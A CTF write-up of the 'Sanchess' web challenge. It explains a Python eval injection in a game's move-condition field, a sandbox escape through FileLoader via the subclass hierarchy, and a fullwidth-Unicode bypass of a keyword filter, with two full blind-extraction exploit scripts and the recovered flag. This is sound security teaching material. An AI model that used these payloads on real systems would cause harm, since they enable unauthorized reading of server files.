# Sanchess CTF Challenge Writeup

## Challenge Information
- **Name:** Sanchess
- **Category:** Web Exploitation
- **Flag:** `ASIS{y0u_M2D3_r!cK_@NGRY}`

## Challenge Description
> Guide Rick through the shadows to discover Morty, armed only with peculiar tools.

The challenge presents a Rick and Morty themed chess-like game where you can program moves for Rick to reach Morty on an 8x8 board.

## Initial Analysis

### The Web Interface
The application is a Flask/Werkzeug Python web app that provides:
- An 8x8 chess-like board with Rick and Morty pieces
- A move builder supporting two types of moves:
  1. **Simple moves**: `up`, `down`, `left`, `right`
  2. **Conditional moves**: Execute different directions based on conditions

### Key Endpoints
- `GET /` - Main game interface
- `POST /simulate` - Process moves and return Rick's path
- `GET /quote` - Returns random Rick quotes

### Move Structure
```javascript
// Simple move
{"type": "simple", "direction": "up"}

// Conditional move
{
  "type": "conditional",
  "condition": {
    "type": "distance",  // or "cell_color"
    "op": ">",           // comparison operator
    "value": 5           // value to compare against
  },
  "then": "down",
  "else": "up"
}
```

## Vulnerability Discovery

### Step 1: Testing Input Fields

I tested various injection payloads in different fields of the `/simulate` endpoint.

**Key Finding:** The `value` field in distance conditions accepts string expressions that get evaluated!

```python
# Testing expression evaluation
{"type": "distance", "op": ">", "value": "1+1"}      # Works! Evaluates to 2
{"type": "distance", "op": ">", "value": "len('hello')"}  # Works! Evaluates to 5
```

### Step 2: Confirming Code Execution

I mapped out which Python functions were allowed:

| Function | Status |
|----------|--------|
| `len()` | ✅ Allowed |
| `str()` | ✅ Allowed |
| `chr()` | ✅ Allowed |
| `int()` | ✅ Allowed |
| `getattr()` | ✅ Allowed |
| `ord()` | ❌ Blocked directly |
| `open()` | ❌ Blocked directly |
| `eval()` | ❌ Blocked |
| `__import__()` | ❌ Blocked |

### Step 3: Finding File Access via Python Class Hierarchy

Since `open()` was blocked directly, I used Python's class hierarchy to find an alternative file access method.

**The breakthrough:** `FileLoader` class from Python's import system!

```python
# Access FileLoader through object subclasses
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]

# Read file using FileLoader.get_data()
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')
```

Testing this worked:
```python
# Expression to get length of flag.txt
"len([c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt'))"
```

## Exploitation (Version 1 - Pre-Patch)

### The Boolean Oracle

The challenge uses Manhattan distance calculation between Rick and Morty positions. With Rick at (0,0) and Morty at (7,1), the distance is 8.

**Exploitation Logic:**
- If `distance > expression_result` → Rick moves DOWN (condition TRUE)
- If `distance <= expression_result` → Rick moves UP (condition FALSE)

By observing Rick's movement, we can determine if our expression evaluated to a value less than 8 (TRUE) or >= 8 (FALSE).

### Blind Character Extraction

To extract flag characters, I used this technique:

```python
# Expression: (flag[pos] == char_code) * 100
# If match: 1 * 100 = 100, and 8 > 100 = FALSE
# If no match: 0 * 100 = 0, and 8 > 0 = TRUE

byte_expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')"
test_expr = f"({byte_expr}[{position}]=={ascii_code})*100"
```

**Oracle interpretation:**
- Response shows Rick moving DOWN (TRUE) → Character does NOT match
- Response shows Rick moving UP (FALSE) → Character MATCHES! ✓

### Pre-Patch Exploit Script

```python
#!/usr/bin/env python3
"""
Sanchess CTF - Flag Extraction Exploit (Pre-Patch Version)
Uses FileLoader class to read flag.txt
"""

import requests
import string
import time

BASE_URL = "http://65.109.194.105:9090"
SESSION = requests.Session()

def test_expr(expr, distance=8):
    """Test if distance > expr"""
    morty_row = min(distance, 7)
    morty_col = max(0, distance - 7)

    payload = {
        "rick": {"row": 0, "col": 0},
        "morty": {"row": morty_row, "col": morty_col},
        "moves": [{
            "type": "conditional",
            "condition": {"type": "distance", "op": ">", "value": expr},
            "then": "down",
            "else": "up"
        }]
    }

    try:
        r = SESSION.post(f"{BASE_URL}/simulate", json=payload, timeout=10)
        data = r.json()
        if "Error" in data:
            return None
        path = data.get("path", [])
        if len(path) >= 2:
            return path[1]["row"] > path[0]["row"]
        return None
    except:
        return None

def check_char(pos, char_code):
    """
    Check if flag[pos] == char_code
    Returns True if MATCH, False if no match
    """
    byte_expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')"
    expr = f"({byte_expr}[{pos}]=={char_code})*100"
    result = test_expr(expr)

    if result is None:
        return None
    # False means match (8 > 100 is False)
    return result == False

def extract_flag():
    """Extract the complete flag"""
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}-!@#$%^&*()."
    flag = ""

    print("[*] Extracting flag...")

    for pos in range(100):
        found = False
        for char in charset:
            if check_char(pos, ord(char)):
                flag += char
                print(f"    [{pos}] '{char}' -> {flag}")
                found = True
                break
            time.sleep(0.02)

        if not found:
            print(f"    [{pos}] No match found - END")
            break

        if char == '}':
            print("\n[+] Flag complete!")
            break

    return flag

if __name__ == "__main__":
    print("=" * 60)
    print("Sanchess CTF - Flag Extraction")
    print("=" * 60)

    # Verify method works
    print("\n[*] Verifying extraction method...")
    print(f"    flag[0] == 'A': {check_char(0, 65)}")  # Should be True
    print(f"    flag[0] == 'B': {check_char(0, 66)}")  # Should be False

    # Extract flag
    flag = extract_flag()

    print("\n" + "=" * 60)
    print(f"FLAG: {flag}")
    print("=" * 60)
```

---

## Exploitation (Version 2 - Post-Patch with Unicode Normalization Bypass)

After the initial exploit was discovered, the challenge was patched to block keywords like `open`, `read`, `flag`, etc. However, the filter could be bypassed using **Unicode Normalization**.

### The Unicode Normalization Bypass

Python (and many web frameworks) normalize Unicode characters before processing. This means **Fullwidth Unicode characters** (U+FF01 to U+FF5E) get normalized to their ASCII equivalents.

For example:
- `ｏｐｅｎ` (Fullwidth) → `open` (ASCII) after normalization
- `ｒｅａｄ` (Fullwidth) → `read` (ASCII) after normalization

The filter checks for blocked keywords **before** normalization, but Python evaluates the expression **after** normalization!

### Conversion Function

```python
def to_fullwidth(s):
    """
    Converts ASCII characters to their Fullwidth Unicode equivalents.
    This bypasses filters that look for "open", "eval", "_", etc.
    """
    res = ""
    for char in s:
        code = ord(char)
        # Shift ASCII to Fullwidth (Offset 0xFEE0)
        # Range: ! (33) to ~ (126)
        if 33 <= code <= 126:
            res += chr(code + 0xFEE0)
        else:
            res += char
    return res

# Examples:
# to_fullwidth("open") -> "ｏｐｅｎ"
# to_fullwidth("read") -> "ｒｅａｄ"
```

### Post-Patch Exploit Payload

```python
# Fullwidth function names bypass the filter
func_open = to_fullwidth("open")   # ｏｐｅｎ
func_read = to_fullwidth("read")   # ｒｅａｄ

# Filename can use string concatenation to bypass "flag" filter
fname = "'fl'+'ag.txt'"

# Final payload: ｏｐｅｎ('fl'+'ag.txt').ｒｅａｄ()[pos] == 'char'
payload = f"{func_open}({fname}).{func_read}()[{pos}] == '{char}'"
```

### Post-Patch Exploit Script

```python
#!/usr/bin/env python3
"""
Sanchess CTF - Flag Extraction Exploit (Post-Patch Version)
Uses Unicode Normalization Bypass to evade keyword filters
"""

import requests
import sys

BASE_URL = "http://65.109.194.105:9090/"
SESSION = requests.Session()

def to_fullwidth(s):
    """
    Converts ASCII characters to their Fullwidth Unicode equivalents.
    This bypasses filters that look for "open", "eval", "_", etc.
    """
    res = ""
    for char in s:
        code = ord(char)
        # Shift ASCII to Fullwidth (Offset 0xFEE0)
        # Range: ! (33) to ~ (126)
        if 33 <= code <= 126:
            res += chr(code + 0xFEE0)
        else:
            res += char
    return res

def send_move(payload_expr):
    """
    Sends the payload to the server.

    Logic:
    - Match found -> Return 100 -> Distance (8) > 100 is False -> Move UP
    - No Match    -> Return 0   -> Distance (8) > 0 is True   -> Move DOWN
    """
    final_payload = f"({payload_expr}) * 100"

    json_body = {
        "rick": {"row": 0, "col": 0},
        "morty": {"row": 7, "col": 1},
        "moves": [{
            "type": "conditional",
            "condition": {"type": "distance", "op": ">", "value": final_payload},
            "then": "down",
            "else": "up"
        }]
    }

    try:
        r = SESSION.post(f"{BASE_URL}/simulate", json=json_body, timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if "error" in data or not data.get("path"):
            return None

        path = data["path"]
        if len(path) < 2:
            return None

        # UP (Row stays 0) = MATCH
        if path[1]['row'] == 0:
            return True
        else:
            return False
    except Exception:
        return None

def brute_force_flag():
    print("[*] Starting Unicode Normalization Bypass...")

    # Construct the payload elements
    # Function names MUST be Fullwidth to bypass filters
    # String literals (filenames) MUST be ASCII to match the filesystem
    func_open = to_fullwidth("open")   # ｏｐｅｎ
    func_read = to_fullwidth("read")   # ｒｅａｄ

    # Filename with string concatenation to bypass "flag" filter
    fname = "'fl'+'ag.txt'"

    print(f"[*] Payload Template: {func_open}({fname}).{func_read}()[pos]")

    flag = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?"

    for pos in range(0, 50):
        found = False
        sys.stdout.write(f"\r[{pos}] ")

        for char in charset:
            # Escape quotes in the comparison character
            safe_char = char
            if char == "'":
                safe_char = "\\'"

            # Construct the injection payload
            # "ｏｐｅｎ('fl'+'ag.txt').ｒｅａｄ()[pos] == 'c'"
            expr = f"{func_open}({fname}).{func_read}()[{pos}] == '{safe_char}'"

            res = send_move(expr)

            if res is True:
                flag += char
                print(f"\r[+] Flag: {flag}                 ")
                found = True
                break

        if not found:
            print(f"\n[!] Stalled at position {pos}. End of flag?")
            break

    print(f"\nFinal Flag: {flag}")

if __name__ == "__main__":
    brute_force_flag()
```

### Running the Post-Patch Exploit

```bash
$ python3 exploit_v2.py
[*] Starting Unicode Normalization Bypass...
[*] Payload Template: ｏｐｅｎ('fl'+'ag.txt').ｒｅａｄ()[pos]
[+] Flag: A
[+] Flag: AS
[+] Flag: ASI
[+] Flag: ASIS
[+] Flag: ASIS{
[+] Flag: ASIS{y
[+] Flag: ASIS{y0
[+] Flag: ASIS{y0u
[+] Flag: ASIS{y0u_
[+] Flag: ASIS{y0u_M
[+] Flag: ASIS{y0u_M2
[+] Flag: ASIS{y0u_M2D
[+] Flag: ASIS{y0u_M2D3
[+] Flag: ASIS{y0u_M2D3_
[+] Flag: ASIS{y0u_M2D3_r
[+] Flag: ASIS{y0u_M2D3_r!
[+] Flag: ASIS{y0u_M2D3_r!c
[+] Flag: ASIS{y0u_M2D3_r!cK
[+] Flag: ASIS{y0u_M2D3_r!cK_
[+] Flag: ASIS{y0u_M2D3_r!cK_@
[+] Flag: ASIS{y0u_M2D3_r!cK_@N
[+] Flag: ASIS{y0u_M2D3_r!cK_@NG
[+] Flag: ASIS{y0u_M2D3_r!cK_@NGR
[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY
[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY}

Final Flag: ASIS{y0u_M2D3_r!cK_@NGRY}
```

---

## Flag
```
ASIS{y0u_M2D3_r!cK_@NGRY}
```
(Translates to: "you made Rick angry")

---

## Summary of Techniques Used

| Version | Technique | Bypass Method |
|---------|-----------|---------------|
| Pre-Patch | Python Class Hierarchy | `FileLoader.get_data()` via `().__class__.__base__.__subclasses__()` |
| Post-Patch | Unicode Normalization | Fullwidth characters `ｏｐｅｎ` → `open` after normalization |

---

## Key Takeaways

1. **Python Sandbox Escapes**: Even when common dangerous functions like `open()`, `eval()`, and `__import__()` are blocked, Python's rich class hierarchy often provides alternative paths to achieve the same goal.

2. **FileLoader Technique**: The `importlib` module's `FileLoader` class has a `get_data()` method that can read arbitrary files - a common sandbox escape technique.

3. **Unicode Normalization Bypass**: Many applications normalize Unicode input, which can be exploited to bypass keyword-based filters. Fullwidth characters (U+FF01-U+FF5E) normalize to ASCII equivalents.

4. **Boolean-Based Blind Extraction**: When direct output isn't available, boolean conditions (like movement direction) can be used as an oracle to extract data character by character.

5. **String Concatenation**: Filters blocking specific strings like `"flag"` can often be bypassed with concatenation: `'fl'+'ag.txt'`

6. **The Hint**: "armed only with peculiar tools" referred to the conditional move system being the exploitation vector.

---

## References
- [Python Sandbox Escape Techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Unicode Normalization Attacks](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [Fullwidth Unicode Characters](https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block))
